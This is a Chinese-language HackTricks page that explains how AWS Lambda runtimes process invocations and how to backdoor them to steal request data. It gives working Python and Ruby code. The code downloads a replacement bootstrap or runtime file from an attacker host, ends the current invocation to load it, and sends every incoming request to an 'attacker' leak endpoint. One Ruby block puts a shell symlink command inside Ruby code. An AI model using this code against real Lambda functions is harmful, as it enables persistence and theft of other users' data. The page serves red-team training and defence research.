# AWS - 窃取Lambda请求

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 简介 <a href="#python-runtime" id="python-runtime"></a>

这种攻击假设您对正在运行的Lambda有某种**访问权限**。\
另外，重要的一点是**Lambda调用并不是完全隔离的，但它们是被隔离的**。它们可以在同一个执行环境中运行，尽管不是同时。了解这一点，让我们开始解剖那个环境。

### 隔离

Lambda隔离使用以下cgroups：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (4).png" alt=""><figcaption></figcaption></figure>

由于前缀'sandbox'没有匹配任何常见的容器引擎（docker, podman, LXD, rkt），它可能是一个专有的容器引擎，可能在内部使用像[runC](https://github.com/opencontainers/runc)这样的开源容器运行时。

### Lambdas的工作原理  <a href="#python-runtime" id="python-runtime"></a>

这似乎是python Lambda架构：

<figure><img src="../../../../.gitbook/assets/image (2) (6).png" alt=""><figcaption></figcaption></figure>

1. 一个位于容器外部的进程，被称为init二进制文件中的“**slicer**”，通过共享内存向**init**进程发送调用事件。
2. init进程在端口9001（硬编码）上设置了一个HTTP服务器，暴露了几个端点：
   1. /2018-06-01/runtime/invocation/**next** – 获取下一个调用事件
   2. /2018-06-01/runtime/invocation/{invoke-id}/**response** – 返回调用的处理器响应
   3. /2018-06-01/runtime/invocation/{invoke-id}/**error** – 返回执行错误
3. 在`bootstrap.py`中，以下循环**查询init进程以获取新事件**，然后**调用用户的函数**来处理它（这里，您上传的请求处理器运行）。\


<figure><img src="../../../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>
4. 然后通过以下端点之一将**处理器响应发送回init进程**：
   1. `/{invoke-id}/response` – 如果用户处理器成功执行
   2. `/{invoke-id}/error` – 如果在处理调用期间引发了异常

## 技术总结 <a href="#python-runtime" id="python-runtime"></a>

有可能用恶意代码**替换bootstrap脚本**，以便能够**截获**发送到Lambda函数的数据。\
注意**其他语言中的其他引擎**也有用那种语言编写的另一个**bootstrap脚本**，所以这也可以在使用其他语言的**其他lambdas**中完成，不仅仅是在python中。

## Python <a href="#python-runtime" id="python-runtime"></a>

从lambda下载**`/var/runtime/bootstrap.py`**（或者只是启动**您自己的lambda**并获取它），并添加后门，它将泄露发送到Lambda的所有数据。您只需要添加几行代码，例如：

<figure><img src="../../../../.gitbook/assets/image (2) (1) (3).png" alt=""><figcaption></figcaption></figure>

### 替换运行时

现在，创建了新的**`boostrap.py`**，可以**下载**它，**结束当前lambda** **调用**并运行它以**替换**合法的一个：
```python
import os
from urllib import request

# Download bootstrap.py from your server
r = request.urlopen('http://attacker.com/bootstrap.py')
with open('/tmp/bootstrap.py', 'w') as f:
f.write(r.read().decode('utf-8'))

# Get invocation ID and end it
req = request.urlopen("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")
inv_id = req.headers["Lambda-Runtime-Aws-Request-Id"]
req = request.Request(f"http://127.0.0.1:9001/2018-06-01/runtime/invocation/{inv_id}/response", data=b"null")
req.add_header("Content-Type", "application/x-www-form-urlencoded")
request.urlopen(req)

# Start your bootstrap.py
os.system("python3 /tmp/bootstrap.py")
```
您也可以使用 [twist\_runtime.py](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/twist\_runtime.py)，它将像之前一样结束调用，运行新的 bootstrap 并泄露信息。

{% hint style="warning" %}
如果一个 lambda 函数在 5-15 分钟内没有被使用，它将被关闭，下次调用时所有更改都将丢失。
{% endhint %}

## Ruby 运行时 <a href="#ruby-runtime" id="ruby-runtime"></a>

在 ruby 中，您想要后门的文件是 **`/var/runtime/lib/runtime.rb`** 文件（从系统中获取或运行您自己的 lambda）。

添加后门就像在 python 版本中一样简单：
```ruby
# Add a require at the beggining
require 'json'
require 'net/http'
[...]
# In the loop where the invocation is treated
begin
context = lambdaContext.new(raw_request)
uri = URI('http://attacker:80/leak')
Net::HTTP.post(uri,JSON.generate(request))
[...]
```
接着，您只需按照您在python版本中所做的操作进行一些更改：

* **在一个目录中下载后门**
* **符号链接** `/var/runtime/lib/*` 到后门所在的目录
* 结束当前的lambda调用
```ruby
# You can get a ruby shell with 'irb' or run from shell with ruby -e "..."

require 'net/http'

# Downloading new script
uri = URI("http://attacker/rumtime.rb")
r = Net::HTTP.get_response(uri)
File.write("/tmp/rumtime.rb", r.body)

# Create symlink
ln -s /var/runtime/lib/* /tmp

# Terminate currrent invocation
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/next')
req = Net::HTTP.get_response(uri)
inv_id = req.header['Lambda-Runtime-Aws-Request-Id']
uri = URI('http://127.0.0.1:9001/2018-06-01/runtime/invocation/'+inv_id+'/response')
Net::HTTP.post(uri, 'null')
```
## 参考资料

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

其他支持HackTricks的方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
